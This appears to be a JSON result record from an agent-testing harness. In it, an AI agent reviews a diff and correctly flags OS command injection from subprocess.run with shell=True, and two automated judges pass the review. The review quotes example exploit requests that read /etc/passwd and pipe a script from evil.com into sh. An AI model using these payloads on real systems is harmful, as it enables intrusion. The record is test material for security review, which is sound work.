@@ -1,0 +1,52 @@
+{
+  "caseId": "cmdi-shell-true",
+  "rep": 5,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-cmdi.patch"
+  ],
+  "output": "**Critical: OS command injection in `src/net/ping.py:9`**\n\nThe diff changes the `subprocess.run` call from a safe argv-list form to `shell=True` with the `host` query parameter concatenated directly into the shell command string:\n\n```python\nresult = subprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True, text=True)\n```\n\n`host` comes straight from `request.GET.get(\"host\", \"\")` with no validation or escaping. Since `shell=True` runs the string through `/bin/sh -c`, any shell metacharacters in `host` (`;`, `&&`, `|`, `` ` ``, `$()`, `>`, etc.) are interpreted. An unauthenticated request like:\n\n```\nGET /ping?host=;cat+/etc/passwd\nGET /ping?host=$(curl+evil.com/x.sh|sh)\n```\n\nresults in arbitrary command execution with the web server's privileges — full RCE.\n\n**Fix:** revert to the list form and drop `shell=True`:\n```python\nresult = subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True)\n```\nand additionally validate `host` is a well-formed hostname/IP before use, since even the list form will happily pass attacker-controlled ping flags/arguments if `host` contains spaces (e.g. `host=-c 100 example.com` for a DoS-style flood, or arbitrary flags). A regex allowlist (e.g. `^[a-zA-Z0-9.-]+$`) is the simplest guard.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-18T22:39:31.750Z",
+  "durationMs": 29630,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identifies the OS command injection vulnerability, precisely describing how the user-controlled `host` parameter from `request.GET` is concatenated into a shell command string and executed via `subprocess.run` with `shell=True`, including concrete exploit examples and a correct fix recommendation.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identifies the OS command injection vulnerability, precisely describing how the user-controlled `host` parameter from `request.GET` is concatenated into a shell command string and executed via `subprocess.run` with `shell=True`, including concrete exploit examples and a correct fix recommendation."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified that the diff introduces an OS command injection vulnerability by switching subprocess.run to shell=True with the user-controlled 'host' GET parameter concatenated directly into the shell command string, explained the exploitation mechanism (shell metacharacters, /bin/sh -c interpretation), gave concrete attack examples, and recommended reverting to the argv-list form without shell=True — this squarely matches the rubric's required finding.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified that the diff introduces an OS command injection vulnerability by switching subprocess.run to shell=True with the user-controlled 'host' GET parameter concatenated directly into the shell command string, explained the exploitation mechanism (shell metacharacters, /bin/sh -c interpretation), gave concrete attack examples, and recommended reverting to the argv-list form without shell=True — this squarely matches the rubric's required finding."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe review must correctly identify an OS command injection vulnerability in the diff: the user-controlled 'host' value from request.GET is passed to subprocess.run with shell=True via string concatenation, allowing shell command injection. PASS only if command injection (or an equivalent unambiguous description) is identified as a genuine security vulnerability; FAIL if it misses it or makes only stylistic comments.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n**Critical: OS command injection in `src/net/ping.py:9`**\n\nThe diff changes the `subprocess.run` call from a safe argv-list form to `shell=True` with the `host` query parameter concatenated directly into the shell command string:\n\n```python\nresult = subprocess.run(\"ping -c 1 \" + host, shell=True, capture_output=True, text=True)\n```\n\n`host` comes straight from `request.GET.get(\"host\", \"\")` with no validation or escaping. Since `shell=True` runs the string through `/bin/sh -c`, any shell metacharacters in `host` (`;`, `&&`, `|`, `` ` ``, `$()`, `>`, etc.) are interpreted. An unauthenticated request like:\n\n```\nGET /ping?host=;cat+/etc/passwd\nGET /ping?host=$(curl+evil.com/x.sh|sh)\n```\n\nresults in arbitrary command execution with the web server's privileges — full RCE.\n\n**Fix:** revert to the list form and drop `shell=True`:\n```python\nresult = subprocess.run([\"ping\", \"-c\", \"1\", host], capture_output=True, text=True)\n```\nand additionally validate `host` is a well-formed hostname/IP before use, since even the list form will happily pass attacker-controlled ping flags/arguments if `host` contains spaces (e.g. `host=-c 100 example.com` for a DoS-style flood, or arbitrary flags). A regex allowlist (e.g. `^[a-zA-Z0-9.-]+$`) is the simplest guard.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "transcript": {
+    "command": "claude",
+    "args": [
+      "-p",
+      "Review this diff for security issues and report your findings. Read the file 'diff-cmdi.patch' in your current working directory, then review it.",
+      "--permission-mode",
+      "bypassPermissions",
+      "--model",
+      "claude-sonnet-5"
+    ],
+    "exitCode": 0,
+    "timedOut": false,
+    "stderr": "Warning: no stdin data received in 3s, proceeding without it. If piping from a slow command, redirect stdin explicitly: < /dev/null to skip, or wait longer."
+  }
+}
